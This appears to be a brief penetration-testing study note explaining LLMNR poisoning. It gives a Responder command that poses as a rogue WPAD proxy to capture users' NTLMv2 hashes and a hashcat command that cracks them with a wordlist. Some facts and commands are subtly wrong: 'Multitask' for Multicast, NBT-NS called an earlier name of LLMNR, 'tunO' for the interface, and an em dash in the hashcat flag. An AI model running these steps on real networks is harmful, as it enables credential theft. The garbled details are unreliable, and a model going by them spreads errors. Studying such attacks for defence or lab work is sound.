
**LLMNR** (Link Local Multitask Name Resolution) is used to identify hosts when DNS fails to do so in a network. Previously *also known as NBT-NS*

The flaw in this protocol is, it uses the user's username and the NTLMv2 hash which can be exploited by a Man in the Middle Attack.

![[LLMNR Poisoning.png]]

1. First we can use a tool like responder to listen to LLMNR messages in a network. 
   
```bash
sudo responder -I tunO -dwP
```

`-d`: Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response.  
`-w`: Start the WPAD rogue proxy server. Default value is False
`-P`: Force NTLM (transparently)/Basic (prompt) authentication for the proxy. WPAD doesn't need to be ON. This option is highly effective. Default: False

![[LLMNR Responder Output.png]]

2. Once a request is made, the responder can catch it with the username of the client along their NTLM hash.
  ![[LLMNR Event.png]]
  
3. If the password the user has set is weak, we can use a tool like `hashcat` to crack the password. eg:  
   
```bash
hashcat —m 5600 hashes.txt rockyou.txt
```
   ![[LLMNR Hash Crack.png]]
   

